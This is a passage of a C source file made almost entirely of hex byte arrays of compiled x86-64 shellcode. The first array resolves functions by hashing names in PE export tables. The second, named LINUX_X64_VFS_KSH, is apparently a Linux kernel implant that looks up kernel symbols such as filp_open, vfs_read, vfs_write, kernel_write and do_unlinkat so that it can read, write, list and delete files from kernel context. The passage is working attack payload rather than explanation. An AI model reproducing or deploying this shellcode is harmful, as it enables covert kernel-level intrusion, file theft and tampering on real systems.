  0xd2, 0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x84, 0x09, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x4d, 0x67, 0x4b,
  0x8d, 0x04, 0xf6, 0x48, 0xc1, 0xe0, 0x06, 0x48, 0x89, 0x83, 0x00, 0x02, 0x00, 0x00, 0x48, 0x85,
  0xc9, 0x74, 0x09, 0x41, 0xff, 0x97, 0x88, 0x00, 0x00, 0x00, 0x33, 0xd2, 0x4d, 0x85, 0xf6, 0x0f,
  0x45, 0xfa, 0x8b, 0xc7, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x38,
  0x49, 0x8b, 0x73, 0x40, 0x49, 0x8b, 0x7b, 0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41,
  0x5d, 0x41, 0x5c, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
  0x24, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8d, 0x6c, 0x24, 0xb9, 0x48, 0x81, 0xec, 0xb0, 0x00,
  0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xf1, 0xbb, 0x30, 0x00,
  0x00, 0x00, 0x8b, 0xd3, 0x48, 0x8d, 0x4d, 0x17, 0x4d, 0x8b, 0xf0, 0xff, 0x97, 0x80, 0x00, 0x00,
  0x00, 0x8d, 0x53, 0xe0, 0x48, 0x8d, 0x4d, 0xf7, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x49, 0x8d,
  0x96, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff, 0x57, 0x78, 0x83, 0x64, 0x24, 0x50,
  0x00, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x83, 0x64, 0x24, 0x48, 0x00, 0x4c, 0x8d, 0x4d, 0xf7, 0x48,
  0x83, 0x65, 0x1f, 0x00, 0x4c, 0x8d, 0x45, 0x17, 0xc7, 0x44, 0x24, 0x40, 0x20, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x4d, 0x6f, 0xc7, 0x44, 0x24, 0x38, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x57, 0xc0, 0xc7,
  0x44, 0x24, 0x30, 0x03, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x80, 0xc7, 0x44, 0x24, 0x28,
  0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x89, 0x5d, 0x17, 0x48, 0xc7,
  0x45, 0x2f, 0x40, 0x02, 0x00, 0x00, 0x48, 0x89, 0x45, 0x27, 0xf3, 0x0f, 0x7f, 0x45, 0x37, 0xff,
  0x97, 0x90, 0x00, 0x00, 0x00, 0x8b, 0xd8, 0x85, 0xc0, 0x75, 0x59, 0x48, 0x83, 0x64, 0x24, 0x40,
  0x00, 0x49, 0x8d, 0x86, 0x28, 0x03, 0x00, 0x00, 0x48, 0x8b, 0x8e, 0x08, 0x02, 0x00, 0x00, 0x45,
  0x33, 0xc9, 0x48, 0x03, 0x4e, 0x28, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x33, 0xd2,
  0x41, 0x8b, 0x86, 0x30, 0x03, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x45, 0xf7, 0x48,
  0x89, 0x4c, 0x24, 0x28, 0x48, 0x8b, 0x4d, 0x6f, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x97, 0xb8,
  0x00, 0x00, 0x00, 0x8b, 0xd8, 0x85, 0xc0, 0x75, 0x0b, 0x48, 0x8b, 0x45, 0xff, 0x48, 0x89, 0x86,
  0x00, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x6f, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x97, 0x88,
  0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0xc3, 0x49, 0x8b, 0x5b,
  0x20, 0x49, 0x8b, 0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc,
  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8d,
  0x6c, 0x24, 0xb9, 0x48, 0x81, 0xec, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00, 0x48,
  0x8d, 0x4d, 0x17, 0x48, 0x8b, 0xfa, 0xbb, 0x30, 0x00, 0x00, 0x00, 0x8b, 0xd3, 0x49, 0x8b, 0xf0,
  0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x8d, 0x53, 0xe0, 0x48, 0x8d, 0x4d, 0xf7, 0xff, 0x97, 0x80,
  0x00, 0x00, 0x00, 0x48, 0x8d, 0x96, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff, 0x57,
  0x78, 0x48, 0x8b, 0x4e, 0x10, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x83, 0x65, 0x1f, 0x00, 0x4c, 0x8d,
  0xb6, 0x28, 0x03, 0x00, 0x00, 0x48, 0x89, 0x45, 0x27, 0x0f, 0x57, 0xc0, 0x8a, 0xc1, 0x48, 0x89,
  0x5d, 0x17, 0x24, 0x80, 0x48, 0xc7, 0x45, 0x2f, 0x40, 0x02, 0x00, 0x00, 0xf6, 0xd8, 0xf3, 0x0f,
  0x7f, 0x45, 0x37, 0x1b, 0xd2, 0x81, 0xe2, 0x04, 0x00, 0x00, 0xc0, 0x81, 0xc2, 0x00, 0x00, 0x00,
  0x40, 0xf6, 0xc1, 0x40, 0x74, 0x09, 0x49, 0x83, 0x3e, 0x00, 0x8d, 0x43, 0xd5, 0x74, 0x05, 0xb8,
  0x01, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x50, 0x00, 0x4c, 0x8d, 0x4d, 0xf7, 0x48, 0x83, 0x64,
  0x24, 0x48, 0x00, 0x4c, 0x8d, 0x45, 0x17, 0xc7, 0x44, 0x24, 0x40, 0x20, 0x00, 0x00, 0x00, 0x48,
  0x8d, 0x4d, 0x6f, 0x89, 0x44, 0x24, 0x38, 0x83, 0x64, 0x24, 0x30, 0x00, 0xc7, 0x44, 0x24, 0x28,
  0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0xff, 0x97, 0x90, 0x00, 0x00, 0x00,
  0x8b, 0xd8, 0x85, 0xc0, 0x75, 0x3e, 0x48, 0x83, 0x64, 0x24, 0x40, 0x00, 0x48, 0x8d, 0x8e, 0x38,
  0x03, 0x00, 0x00, 0x8b, 0x86, 0x30, 0x03, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x4c, 0x89, 0x74, 0x24,
  0x38, 0x45, 0x33, 0xc0, 0x89, 0x44, 0x24, 0x30, 0x33, 0xd2, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x48,
  0x8d, 0x45, 0xf7, 0x48, 0x8b, 0x4d, 0x6f, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x97, 0xc0, 0x00,
  0x00, 0x00, 0x8b, 0xd8, 0x48, 0x8b, 0x4d, 0x6f, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x97, 0x88,
  0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0xc3, 0x49, 0x8b, 0x5b,
  0x20, 0x49, 0x8b, 0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc,
  0x40, 0x53, 0x48, 0x81, 0xec, 0xf0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x54, 0x24,
  0x20, 0x48, 0x8b, 0x49, 0x08, 0xe8, 0xda, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x83, 0x08, 0x01, 0x00,
  0x00, 0x4c, 0x03, 0x43, 0x28, 0x48, 0x81, 0xbb, 0x00, 0x01, 0x00, 0x00, 0x38, 0x03, 0x00, 0x00,
  0x0f, 0x82, 0xa7, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x0f, 0x13, 0xaa, 0x93, 0xad, 0x20, 0xe7, 0x79,
  0x49, 0x39, 0x00, 0x0f, 0x85, 0x94, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x40, 0x08, 0x48, 0x83, 0xf8,
  0x01, 0x75, 0x19, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xc0, 0xfa, 0xff, 0xff,
  0x48, 0x63, 0xc8, 0x48, 0x89, 0x8b, 0x20, 0x02, 0x00, 0x00, 0xeb, 0x7d, 0x48, 0x83, 0xf8, 0x03,
  0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0xe9, 0xfc, 0xff, 0xff, 0xeb,
  0xdf, 0x48, 0x83, 0xf8, 0x02, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8,
  0x1c, 0xfe, 0xff, 0xff, 0xeb, 0xca, 0x48, 0x83, 0xf8, 0x04, 0x75, 0x0f, 0x48, 0x8d, 0x54, 0x24,
  0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x8b, 0xf7, 0xff, 0xff, 0xeb, 0xb5, 0x48, 0x83, 0xf8, 0x05, 0x75,
  0x0f, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x56, 0xf8, 0xff, 0xff, 0xeb, 0xa0,
  0x48, 0x83, 0xf8, 0x06, 0x75, 0x23, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xe8, 0x25,
  0xf9, 0xff, 0xff, 0x48, 0x83, 0xa3, 0x20, 0x02, 0x00, 0x00, 0x00, 0xeb, 0x0c, 0xb8, 0x01, 0x00,
  0x00, 0xc0, 0x48, 0x89, 0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xf0, 0x00, 0x00, 0x00,
  0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48,
  0x89, 0x78, 0x18, 0x4c, 0x89, 0x70, 0x20, 0x55, 0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0x90,
  0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf1, 0xc7, 0x45, 0xe7, 0x4a, 0x45, 0x3b, 0xd7, 0xc7, 0x45, 0xeb,
  0x62, 0xe0, 0x07, 0x37, 0x48, 0x8d, 0xba, 0xc8, 0x00, 0x00, 0x00, 0xc7, 0x45, 0xef, 0x1f, 0x9d,
  0x48, 0x9d, 0x48, 0x8d, 0x75, 0x4b, 0xc7, 0x45, 0xf3, 0xa1, 0x7b, 0xcc, 0xdc, 0xbb, 0x19, 0x00,
  0x00, 0x00, 0xc7, 0x45, 0xf7, 0x92, 0x6d, 0x58, 0x58, 0xc7, 0x45, 0xfb, 0xce, 0xad, 0x90, 0x4d,
  0xc7, 0x45, 0xff, 0x57, 0x63, 0x32, 0x5a, 0xc7, 0x45, 0x03, 0x8f, 0xb5, 0x6a, 0x6a, 0xc7, 0x45,
  0x07, 0xf9, 0xbe, 0xdd, 0x05, 0xc7, 0x45, 0x0b, 0xf7, 0x38, 0xb3, 0x9d, 0xc7, 0x45, 0x0f, 0xc9,
  0xc5, 0x6e, 0x6c, 0xc7, 0x45, 0x13, 0x89, 0x83, 0x6c, 0xeb, 0xc7, 0x45, 0x17, 0x9b, 0x97, 0x64,
  0xcf, 0xc7, 0x45, 0x1b, 0x2a, 0xc0, 0xb2, 0xa8, 0xc7, 0x45, 0x1f, 0x3d, 0x28, 0xc3, 0x7c, 0xc7,
  0x45, 0x23, 0x2a, 0xd0, 0x35, 0x30, 0xc7, 0x45, 0x27, 0xdb, 0x4f, 0x3d, 0xc5, 0xc7, 0x45, 0x2b,
  0x61, 0x4c, 0x04, 0x5d, 0xc7, 0x45, 0x2f, 0x9d, 0x8f, 0xa0, 0xc3, 0xc7, 0x45, 0x33, 0xb8, 0xd4,
  0x29, 0x88, 0xc7, 0x45, 0x37, 0x50, 0x64, 0xb0, 0x6f, 0xc7, 0x45, 0x3b, 0xe2, 0xca, 0x61, 0xe6,
  0xc7, 0x45, 0x3f, 0xde, 0x24, 0xe6, 0xf7, 0xc7, 0x45, 0x43, 0x16, 0x35, 0xfd, 0x87, 0xc7, 0x45,
  0x47, 0x36, 0x31, 0x0e, 0x68, 0x48, 0x8d, 0x76, 0xfc, 0x49, 0x8b, 0xce, 0x8b, 0x16, 0x48, 0x8d,
  0x7f, 0xf8, 0xe8, 0x25, 0x00, 0x00, 0x00, 0x48, 0x89, 0x07, 0x83, 0xc3, 0xff, 0x75, 0xe6, 0x4c,
  0x8d, 0x9c, 0x24, 0x90, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49,
  0x8b, 0x7b, 0x20, 0x4d, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0x48, 0x8b, 0xc4, 0x48,
  0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x8b,
  0xea, 0x48, 0x85, 0xc9, 0x74, 0x7a, 0xb8, 0x4d, 0x5a, 0x00, 0x00, 0x66, 0x39, 0x01, 0x75, 0x70,
  0x48, 0x63, 0x41, 0x3c, 0x48, 0x03, 0xc1, 0x74, 0x67, 0x81, 0x38, 0x50, 0x45, 0x00, 0x00, 0x75,
  0x5f, 0x8b, 0x90, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xd1, 0x74, 0x54, 0x44, 0x8b, 0x5a, 0x18,
  0x45, 0x85, 0xdb, 0x74, 0x4b, 0x8b, 0x42, 0x20, 0x85, 0xc0, 0x74, 0x44, 0x8b, 0x72, 0x24, 0x4c,
  0x8d, 0x0c, 0x01, 0x8b, 0x7a, 0x1c, 0x48, 0x03, 0xf1, 0x48, 0x03, 0xf9, 0x45, 0x33, 0xc0, 0x45,
  0x85, 0xdb, 0x74, 0x2c, 0x45, 0x8b, 0x11, 0x4c, 0x03, 0xd1, 0x33, 0xdb, 0xeb, 0x0b, 0x49, 0xff,
  0xc2, 0xc1, 0xcb, 0x0d, 0x0f, 0xb6, 0xc0, 0x03, 0xd8, 0x41, 0x8a, 0x02, 0x84, 0xc0, 0x75, 0xee,
  0x3b, 0xdd, 0x74, 0x23, 0x41, 0xff, 0xc0, 0x49, 0x83, 0xc1, 0x04, 0x45, 0x3b, 0xc3, 0x72, 0xd4,
  0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x08, 0x48, 0x8b, 0x6c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24,
  0x18, 0x48, 0x8b, 0x7c, 0x24, 0x20, 0xc3, 0x46, 0x0f, 0xb7, 0x04, 0x46, 0x44, 0x3b, 0x42, 0x14,
  0x73, 0xde, 0x42, 0x8b, 0x04, 0x87, 0x48, 0x03, 0xc1, 0xeb, 0xd7, 0x00
};

const BYTE LINUX_X64_VFS_KSH[] = {
  0x37, 0x13, 0xec, 0x3c, 0xa5, 0x2e, 0x49, 0x44, 0xa6, 0x2f, 0x82, 0xad, 0x48, 0x31, 0x1b, 0xfa,
  0x58, 0xde, 0x24, 0x02, 0x7f, 0xe4, 0xf1, 0xd2, 0xe3, 0x50, 0x5d, 0x03, 0x97, 0xc4, 0x12, 0xb2,
  0x4c, 0x6d, 0x70, 0x15, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x0c, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x21, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
  0xe8, 0x37, 0x0b, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55,
  0x41, 0x54, 0x4c, 0x8b, 0xf9, 0x4c, 0x8b, 0xf2, 0x4d, 0x8b, 0xe9, 0x49, 0xc1, 0xe5, 0x03, 0x4d,
  0x8b, 0xe0, 0x49, 0x83, 0xed, 0x08, 0x49, 0x8b, 0xcf, 0x4b, 0x8b, 0x14, 0x2e, 0xe8, 0x22, 0x00,
  0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x11, 0x4b, 0x89, 0x04, 0x2c, 0x4d, 0x85, 0xed, 0x75, 0xe2,
  0x48, 0x33, 0xc0, 0x48, 0xff, 0xc0, 0xeb, 0x03, 0x48, 0x33, 0xc0, 0x41, 0x5c, 0x41, 0x5d, 0x41,
  0x5e, 0x41, 0x5f, 0xc3, 0x48, 0x8b, 0xc1, 0x57, 0x56, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xf0, 0x49,
  0x8b, 0xd1, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x4c, 0x8b, 0x44, 0x24, 0x40, 0x4c, 0x8b, 0x4c, 0x24,
  0x48, 0x41, 0x57, 0x4c, 0x8b, 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xff, 0xd0,
  0x49, 0x8b, 0xe7, 0x41, 0x5f, 0x5e, 0x5f, 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x89, 0x0d, 0xf1, 0xff, 0xff, 0xff, 0xc3, 0x41, 0x57, 0x4c, 0x8b, 0xfc, 0x48, 0x83, 0xe4,
  0xf0, 0x41, 0x51, 0x41, 0x50, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xc9, 0x4c, 0x8b, 0xc2, 0x48,
  0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0x48, 0x8b, 0x05, 0xcc, 0xff, 0xff, 0xff, 0xff, 0xd0, 0x49, 0x8b,
  0xe7, 0x41, 0x5f, 0xc3, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0xff, 0xff, 0x48, 0x03,
  0xc1, 0xc3, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0xff, 0xff, 0x48, 0x2b, 0xc8, 0x48,
  0xc1, 0xe9, 0x07, 0x48, 0xc1, 0xe1, 0x0c, 0x48, 0x8b, 0xc1, 0xc3, 0x0f, 0x09, 0xc3, 0xcc, 0xcc,
  0x48, 0x89, 0x5c, 0x24, 0x10, 0x55, 0x56, 0x57, 0x48, 0x8d, 0xac, 0x24, 0x10, 0xff, 0xff, 0xff,
  0x48, 0x81, 0xec, 0xf0, 0x01, 0x00, 0x00, 0x33, 0xf6, 0xc7, 0x85, 0x20, 0x01, 0x00, 0x00, 0x6d,
  0x65, 0x6d, 0x63, 0x48, 0x8d, 0x85, 0x20, 0x01, 0x00, 0x00, 0x66, 0xc7, 0x85, 0x24, 0x01, 0x00,
  0x00, 0x70, 0x79, 0x48, 0x89, 0x45, 0x40, 0x48, 0x8b, 0xda, 0x48, 0x8d, 0x85, 0x28, 0x01, 0x00,
  0x00, 0x40, 0x88, 0xb5, 0x26, 0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 0x48, 0x44, 0x8d, 0x4e, 0x08,
  0x48, 0x8d, 0x45, 0xb0, 0xc7, 0x85, 0x28, 0x01, 0x00, 0x00, 0x6d, 0x65, 0x6d, 0x73, 0x48, 0x89,
  0x45, 0x50, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0x49, 0x10, 0x48, 0x8d, 0x44, 0x24, 0x70, 0x48, 0x89,
  0x45, 0x58, 0x4c, 0x8b, 0xc2, 0x48, 0x8d, 0x44, 0x24, 0x30, 0x66, 0xc7, 0x85, 0x2c, 0x01, 0x00,
  0x00, 0x65, 0x74, 0x48, 0x89, 0x45, 0x60, 0x48, 0x8d, 0x55, 0x40, 0x48, 0x8d, 0x45, 0x80, 0x40,
  0x88, 0xb5, 0x2e, 0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 0x68, 0x48, 0x8d, 0x85, 0x10, 0x01, 0x00,
  0x00, 0x48, 0x89, 0x45, 0x70, 0x48, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x89, 0x45, 0x78, 0xc7, 0x45,
  0xb0, 0x66, 0x69, 0x6c, 0x70, 0xc7, 0x45, 0xb4, 0x5f, 0x63, 0x6c, 0x6f, 0x66, 0xc7, 0x45, 0xb8,
  0x73, 0x65, 0x40, 0x88, 0x75, 0xba, 0xc7, 0x44, 0x24, 0x70, 0x66, 0x69, 0x6c, 0x70, 0xc7, 0x44,
  0x24, 0x74, 0x5f, 0x6f, 0x70, 0x65, 0x66, 0xc7, 0x44, 0x24, 0x78, 0x6e, 0x00, 0xc7, 0x44, 0x24,
  0x30, 0x76, 0x66, 0x73, 0x5f, 0xc7, 0x44, 0x24, 0x34, 0x72, 0x65, 0x61, 0x64, 0x40, 0x88, 0x74,
  0x24, 0x38, 0xc7, 0x45, 0x80, 0x76, 0x66, 0x73, 0x5f, 0xc7, 0x45, 0x84, 0x77, 0x72, 0x69, 0x74,
  0x66, 0xc7, 0x45, 0x88, 0x65, 0x00, 0xc7, 0x85, 0x10, 0x01, 0x00, 0x00, 0x79, 0x69, 0x65, 0x6c,
  0x66, 0xc7, 0x85, 0x14, 0x01, 0x00, 0x00, 0x64, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x70, 0x72, 0x69,
  0x6e, 0x66, 0xc7, 0x44, 0x24, 0x24, 0x74, 0x6b, 0x40, 0x88, 0x74, 0x24, 0x26, 0xe8, 0xe8, 0xfd,
  0xff, 0xff, 0x85, 0xc0, 0x0f, 0x84, 0x4b, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x4f, 0x10, 0x48, 0x8d,
  0x55, 0xc0, 0xc7, 0x45, 0xc0, 0x69, 0x74, 0x65, 0x72, 0xc7, 0x45, 0xc4, 0x61, 0x74, 0x65, 0x5f,
  0xc7, 0x45, 0xc8, 0x64, 0x69, 0x72, 0x00, 0xe8, 0x08, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x43, 0x40,
  0x48, 0x8d, 0x55, 0xd0, 0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x45, 0xd0, 0x76, 0x66, 0x73, 0x5f, 0xc7,
  0x45, 0xd4, 0x72, 0x65, 0x61, 0x64, 0xc7, 0x45, 0xd8, 0x64, 0x69, 0x72, 0x00, 0xe8, 0xe2, 0xfd,
  0xff, 0xff, 0x48, 0x89, 0x43, 0x48, 0x48, 0x39, 0x73, 0x40, 0x75, 0x09, 0x48, 0x85, 0xc0, 0x0f,
  0x84, 0xf0, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x4f, 0x10, 0x48, 0x8d, 0x54, 0x24, 0x40, 0xc7, 0x44,
  0x24, 0x40, 0x76, 0x66, 0x73, 0x5f, 0xc7, 0x44, 0x24, 0x44, 0x73, 0x74, 0x61, 0x74, 0x40, 0x88,
  0x74, 0x24, 0x48, 0xe8, 0xac, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x43, 0x50, 0x48, 0x8d, 0x55, 0x90,
  0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x45, 0x90, 0x76, 0x66, 0x73, 0x5f, 0xc7, 0x45, 0x94, 0x73, 0x74,
  0x61, 0x74, 0x66, 0xc7, 0x45, 0x98, 0x78, 0x00, 0xe8, 0x87, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x43,
  0x58, 0x48, 0x39, 0x73, 0x50, 0x75, 0x09, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x95, 0x01, 0x00, 0x00,
  0x48, 0x8b, 0x4f, 0x10, 0x48, 0x8d, 0x55, 0xa0, 0xc7, 0x45, 0xa0, 0x6b, 0x65, 0x72, 0x6e, 0xc7,
  0x45, 0xa4, 0x5f, 0x70, 0x61, 0x74, 0x66, 0xc7, 0x45, 0xa8, 0x68, 0x00, 0xe8, 0x53, 0xfd, 0xff,
  0xff, 0x48, 0x89, 0x83, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x48, 0x8b, 0x4f,
  0x10, 0xc7, 0x44, 0x24, 0x50, 0x70, 0x61, 0x74, 0x68, 0xc7, 0x44, 0x24, 0x54, 0x5f, 0x70, 0x75,
  0x74, 0x40, 0x88, 0x74, 0x24, 0x58, 0xe8, 0x29, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x83, 0x88, 0x00,
  0x00, 0x00, 0x48, 0x8d, 0x55, 0x20, 0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x45, 0x20, 0x76, 0x66, 0x73,
  0x5f, 0xc7, 0x45, 0x24, 0x67, 0x65, 0x74, 0x61, 0xc7, 0x45, 0x28, 0x74, 0x74, 0x72, 0x5f, 0xc7,
  0x45, 0x2c, 0x6e, 0x6f, 0x73, 0x65, 0x66, 0xc7, 0x45, 0x30, 0x63, 0x00, 0xe8, 0xf3, 0xfc, 0xff,
  0xff, 0x48, 0x89, 0x83, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x8b, 0x4f,
  0x10, 0xc7, 0x44, 0x24, 0x60, 0x76, 0x66, 0x73, 0x5f, 0xc7, 0x44, 0x24, 0x64, 0x73, 0x74, 0x61,
  0x74, 0x40, 0x88, 0x74, 0x24, 0x68, 0xe8, 0xc9, 0xfc, 0xff, 0xff, 0x48, 0x89, 0x43, 0x60, 0x48,
  0x8d, 0x54, 0x24, 0x28, 0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x44, 0x24, 0x28, 0x67, 0x65, 0x74, 0x6e,
  0xc7, 0x44, 0x24, 0x2c, 0x61, 0x6d, 0x65, 0x00, 0xe8, 0xa7, 0xfc, 0xff, 0xff, 0x48, 0x89, 0x43,
  0x68, 0x48, 0x8d, 0x55, 0x10, 0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x45, 0x10, 0x67, 0x65, 0x74, 0x6e,
  0xc7, 0x45, 0x14, 0x61, 0x6d, 0x65, 0x5f, 0xc7, 0x45, 0x18, 0x6b, 0x65, 0x72, 0x6e, 0x66, 0xc7,
  0x45, 0x1c, 0x65, 0x6c, 0x40, 0x88, 0x75, 0x1e, 0xe8, 0x77, 0xfc, 0xff, 0xff, 0x48, 0x89, 0x43,
  0x70, 0x48, 0x8d, 0x55, 0xe0, 0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x45, 0xe0, 0x64, 0x6f, 0x5f, 0x75,
  0xc7, 0x45, 0xe4, 0x6e, 0x6c, 0x69, 0x6e, 0xc7, 0x45, 0xe8, 0x6b, 0x61, 0x74, 0x00, 0xe8, 0x51,
  0xfc, 0xff, 0xff, 0x48, 0x89, 0x43, 0x78, 0x48, 0x39, 0x73, 0x60, 0x75, 0x0b, 0x48, 0x39, 0x73,
  0x68, 0x74, 0x62, 0x48, 0x85, 0xc0, 0x74, 0x5d, 0x48, 0x8b, 0x4f, 0x10, 0x48, 0x8d, 0x55, 0xf0,
  0xc7, 0x45, 0xf0, 0x6b, 0x65, 0x72, 0x6e, 0xc7, 0x45, 0xf4, 0x65, 0x6c, 0x5f, 0x72, 0xc7, 0x45,
  0xf8, 0x65, 0x61, 0x64, 0x00, 0xe8, 0x1a, 0xfc, 0xff, 0xff, 0x48, 0x89, 0x83, 0x98, 0x00, 0x00,
  0x00, 0x48, 0x8d, 0x55, 0x00, 0x48, 0x8b, 0x4f, 0x10, 0xc7, 0x45, 0x00, 0x6b, 0x65, 0x72, 0x6e,
  0xc7, 0x45, 0x04, 0x65, 0x6c, 0x5f, 0x77, 0xc7, 0x45, 0x08, 0x72, 0x69, 0x74, 0x65, 0x40, 0x88,
  0x75, 0x0c, 0xe8, 0xed, 0xfb, 0xff, 0xff, 0x48, 0x89, 0x83, 0xa0, 0x00, 0x00, 0x00, 0xb8, 0x01,
  0x00, 0x00, 0x00, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0x18, 0x02, 0x00, 0x00, 0x48,
  0x81, 0xc4, 0xf0, 0x01, 0x00, 0x00, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83,
  0xec, 0x20, 0x48, 0x8b, 0xda, 0x41, 0xb9, 0xff, 0x01, 0x00, 0x00, 0x49, 0x8d, 0x50, 0x18, 0x48,
